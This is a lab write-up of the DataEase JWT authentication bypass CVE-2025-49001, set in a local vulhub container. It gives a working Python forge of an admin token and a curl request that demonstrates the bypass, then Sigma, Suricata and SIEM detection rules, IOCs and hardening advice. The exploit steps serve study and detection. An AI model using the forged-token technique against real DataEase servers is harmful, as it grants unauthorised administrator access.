# CVE-2025-49001 — DataEase JWT Authentication Bypass

## 1. Overview

| Field | Value |
|-------|-------|
| CVE | CVE-2025-49001 |
| Product | DataEase ≤ 2.10.10 |
| Attack Vector | Network (single forged header, no auth needed) |
| Impact | Authentication Bypass → Admin Impersonation |
| CVSS 3.1 | 9.8 Critical |
| Patch | 2.10.11+ |
| Chainable | CVE-2025-32966 (datasource validation RCE) |

DataEase is an open-source BI/data-visualization platform. In versions up to 2.10.10, the `CommunityTokenFilter` JWT validation has a fatal flaw: when HMAC signature verification throws `SignatureVerificationException`, the filter writes a 401 body but fails to abort the filter chain — it still calls `filterChain.doFilter(...)`. Since the upstream `TokenFilter` populates user context by merely decoding the JWT (no signature check), downstream controllers execute with the attacker's forged `uid=1` (admin) claims.

## 2. Attack Chain

```
Recon: Identify DataEase instance (login page on :8100, X-DE-EXECUTE-VERSION header)
  └─▶ Forge: Create JWT with {uid:1, oid:1} using any HMAC secret
      └─▶ Deliver: GET /de2api/user/info with X-DE-TOKEN: <forged-jwt>
          └─▶ Bypass: Filter chain continues despite signature failure
              └─▶ Impact: Admin-level API access (chain with CVE-2025-32966 for RCE)
```

## 3. Reproduction

### Environment

```bash
cd ~/Security/tools/vulhub/dataease/CVE-2025-49001
docker compose up -d
# DataEase 2.10.7 on port 8100, MySQL 8.4 backend
# Wait ~90s for Java app + DB initialization
```

### Step 1 — Baseline: No Token Returns 401

```bash
curl -sS --noproxy '*' -D - http://127.0.0.1:8100/de2api/user/info
# HTTP/1.1 401
# {"code":401,"msg":"token is empty for uri {/de2api/user/info}","data":null}
```

### Step 2 — Forge Admin JWT with Arbitrary Secret

```bash
python3 -c "
import jwt, time
token = jwt.encode(
    {'uid': 1, 'oid': 1, 'exp': int(time.time()) + 3600},
    'any-secret-will-do',
    algorithm='HS256'
)
print(token)
"
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjoxNzc5MzgzMzk3fQ...
```

The secret is irrelevant — any value works because the filter doesn't abort on signature failure.

### Step 3 — Send Forged Token to Prove Bypass

```bash
curl -sS --noproxy '*' -D - \
  -H "X-DE-TOKEN: <forged-jwt-from-step-2>" \
  http://127.0.0.1:8100/de2api/user/info
# HTTP/1.1 400   ← NOT 401! Signature check was bypassed
# DE-GATEWAY-FLAG: The%20Token%27s%20Signature%20resulted%20invalid...HmacSHA256
# {"code":400,"msg":"Request processing failed: java.lang.IllegalStateException:
#   getWriter() has already been called for this response","data":null}
```

The 400 (not 401) proves the filter chain continued past the signature check. The `IllegalStateException` occurs because `CommunityTokenFilter` already claimed the response writer when it wrote its 401 body, but the downstream controller still attempted to write — confirming it executed with the forged admin identity.

### Why 400 Instead of 200?

The filter writes a 401 response body before calling `doFilter()`. When the controller (now running as uid=1/admin) tries to write its own response, the servlet container throws `IllegalStateException` because the writer is already committed. The bypass is proven by the absence of a clean 401 rejection.

### Cleanup

```bash
cd ~/Security/tools/vulhub/dataease/CVE-2025-49001
docker compose down -v
```

## 4. Lessons Learned

- **Exception handling must abort the chain**: Catching an exception and logging it is not sufficient — if the filter doesn't `return` after writing the error response, the request continues downstream.
- **Decode ≠ Verify**: The upstream `TokenFilter` using `JWT.decode()` without signature verification created a second layer of vulnerability.
- **Defense in depth for JWT**: Signature verification should happen at every layer that reads claims, not just one filter.
- **Header-based auth tokens are forgeable if validation is broken**: Unlike cookie-based sessions with server-side stores, JWT auth relies entirely on cryptographic verification.

## 5. Defense

### 5.1 Hardening

| Layer | Action |
|-------|--------|
| Application | Upgrade DataEase to ≥ 2.10.11 |
| Code Fix | Ensure filter returns immediately after writing error response (`return` after `response.getWriter().write(...)`) |
| Architecture | Use server-side session validation in addition to JWT signature checks |
| WAF | Rate-limit and monitor requests with invalid JWT signatures |
| Network | Restrict DataEase admin API to internal networks only |

### 5.2 Detection — Sigma Rules

```yaml
title: DataEase JWT Authentication Bypass via Forged Token (CVE-2025-49001)
id: 8d4f1a23-5e9c-4b3f-b2d7-0c6e8f3a9b12
status: experimental
description: >
  Detects attempts to bypass DataEase authentication by sending a forged JWT
  with an invalid signature. The DE-GATEWAY-FLAG response header containing
  SignatureVerificationException indicates the bypass was triggered.
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-49001
  - https://github.com/dataease/dataease/security/advisories/GHSA-xx2m-gmwg-mf3r
author: Security Lab
date: 2025/06/01
modified: 2026/05/21
tags:
  - attack.initial_access
  - attack.t1190
  - attack.privilege_escalation
  - attack.t1548
  - cve.2025.49001
logsource:
  category: webserver
  service: access
detection:
  selection_endpoint:
    cs_uri_path|startswith: '/de2api/'
  selection_header:
    cs_header_names|contains: 'X-DE-TOKEN'
  selection_response:
    sc_header_value|contains: 'SignatureVerificationException'
  condition: selection_endpoint and selection_header and selection_response
falsepositives:
  - Legitimate users with expired or corrupted tokens (would still show 401, not 400)
level: critical
```

```yaml
title: DataEase Admin API Access Without Valid Authentication
id: 8d4f1a23-5e9c-4b3f-b2d7-0c6e8f3a9b13
status: experimental
description: >
  Detects access to DataEase admin endpoints that return non-401 status codes
  when the DE-GATEWAY-FLAG header indicates a signature verification failure.
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-49001
author: Security Lab
date: 2025/06/01
tags:
  - attack.initial_access
  - attack.t1190
  - cve.2025.49001
logsource:
  category: webserver
  service: access
detection:
  selection:
    cs_uri_path|contains:
      - '/de2api/user/'
      - '/de2api/datasource/'
      - '/de2api/panel/'
      - '/de2api/dataset/'
    sc_status:
      - 400
      - 200
  filter_legitimate:
    sc_status: 401
  condition: selection and not filter_legitimate
falsepositives:
  - Normal authenticated admin operations
level: high
```

### 5.3 Detection — Suricata Rules

```
alert http any any -> $HOME_NET any ( \
  msg:"CVE-2025-49001 DataEase JWT Auth Bypass - X-DE-TOKEN with Forged JWT"; \
  flow:to_server,established; \
  http.header.names; content:"X-DE-TOKEN"; nocase; \
  http.uri; content:"/de2api/"; \
  classtype:web-application-attack; \
  sid:2025049001; rev:1; \
  metadata:cve CVE-2025-49001, attack_target web_server, \
           mitre_tactic initial_access, mitre_technique T1190; \
  reference:cve,2025-49001; \
)

alert http $HOME_NET any -> any any ( \
  msg:"CVE-2025-49001 DataEase JWT Bypass Confirmed - DE-GATEWAY-FLAG SignatureVerification"; \
  flow:to_client,established; \
  http.header; content:"DE-GATEWAY-FLAG"; content:"Signature"; distance:0; \
  http.stat_code; content:"400"; \
  classtype:web-application-attack; \
  sid:2025049002; rev:1; \
  metadata:cve CVE-2025-49001, attack_target web_server, \
           mitre_tactic initial_access, mitre_technique T1190; \
  reference:cve,2025-49001; \
)
```

### 5.4 IOC Table

| Type | Indicator | Context |
|------|-----------|---------|
| HTTP Header | `X-DE-TOKEN` with invalid signature JWT | Attack delivery mechanism |
| Response Header | `DE-GATEWAY-FLAG` containing `SignatureVerificationException` | Bypass confirmation |
| HTTP Status | 400 on `/de2api/` endpoints (instead of 401) | Successful bypass indicator |
| JWT Claims | `uid: 1, oid: 1` in forged token | Admin impersonation (uid=1 is default admin) |
| Behavioral | Requests to `/de2api/datasource/validate` after bypass | CVE-2025-32966 RCE chain |
| Software Version | `X-DE-EXECUTE-VERSION: 2.10.7` (or ≤ 2.10.10) | Vulnerable version fingerprint |
| Behavioral | Multiple `/de2api/` requests from same IP with varying JWT values | Brute-force/testing |

### 5.5 SIEM Hunting Queries

**Splunk SPL — Detect forged JWT attempts against DataEase:**

```spl
index=web sourcetype=access_combined OR sourcetype=nginx:access
  uri_path="/de2api/*"
| rex field=_raw "DE-GATEWAY-FLAG[:\s]+(?<gateway_flag>[^\r\n\"]+)"
| where isnotnull(gateway_flag)
| eval flag_decoded=urldecode(gateway_flag)
| where like(flag_decoded, "%Signature%invalid%") OR like(flag_decoded, "%SignatureVerification%")
| stats count min(_time) as first_seen max(_time) as last_seen
        values(uri_path) as targeted_endpoints
        dc(uri_path) as endpoint_count
        by src_ip
| where count >= 1
| sort - count
```

**Splunk SPL — DataEase admin API access anomaly (post-bypass):**

```spl
index=web sourcetype=access_combined OR sourcetype=nginx:access
  (uri_path="/de2api/user/*" OR uri_path="/de2api/datasource/*" OR uri_path="/de2api/panel/*")
  status!=401
| rex field=_raw "X-DE-TOKEN[:\s]+(?<de_token>[^\r\n\" ]+)"
| where isnotnull(de_token)
| eval token_parts=split(de_token, ".")
| where mvcount(token_parts)==3
| stats count values(uri_path) as paths values(status) as statuses by src_ip
| where count >= 3
| sort - count
```

**Microsoft Sentinel KQL — DataEase JWT bypass detection:**

```kql
W3CIISLog
| where TimeGenerated > ago(24h)
| where csUriStem startswith "/de2api/"
| extend gateway_flag = extract("DE-GATEWAY-FLAG[: ]+([^\\r\\n]+)", 1, tostring(AdditionalFields))
| where isnotempty(gateway_flag)
| extend flag_decoded = url_decode(gateway_flag)
| where flag_decoded has "Signature" and flag_decoded has "invalid"
| project TimeGenerated, cIP, csUriStem, csMethod, scStatus, flag_decoded
| summarize attempt_count = count(),
            endpoints = make_set(csUriStem),
            first_seen = min(TimeGenerated),
            last_seen = max(TimeGenerated)
        by cIP
| sort by attempt_count desc
```

**Microsoft Sentinel KQL — DataEase non-401 responses to protected API:**

```kql
W3CIISLog
| where TimeGenerated > ago(24h)
| where csUriStem startswith "/de2api/"
| where scStatus != 401 and scStatus != 404
| extend has_de_token = tostring(AdditionalFields) has "X-DE-TOKEN"
| where has_de_token
| summarize request_count = count(),
            status_codes = make_set(scStatus),
            paths = make_set(csUriStem)
        by cIP, bin(TimeGenerated, 5m)
| where request_count >= 5
| sort by request_count desc
```

## 6. Tools & References

| Tool | Purpose |
|------|---------|
| python3 + PyJWT | JWT token forging |
| curl | HTTP request with custom headers |
| docker / vulhub | Local vulnerable environment |

- [GitHub Advisory — GHSA-xx2m-gmwg-mf3r](https://github.com/dataease/dataease/security/advisories/GHSA-xx2m-gmwg-mf3r)
- [NVD — CVE-2025-49001](https://nvd.nist.gov/vuln/detail/CVE-2025-49001)
- [CVE-2025-32966 (RCE chain)](https://github.com/dataease/dataease/security/advisories/GHSA-h7hj-4j78-cvc7)

## 7. Disclaimer

This reproduction was performed in an isolated Docker environment (vulhub) on localhost for educational purposes only. No production systems were targeted. The goal is to understand the vulnerability mechanism and develop effective detection/hardening strategies.
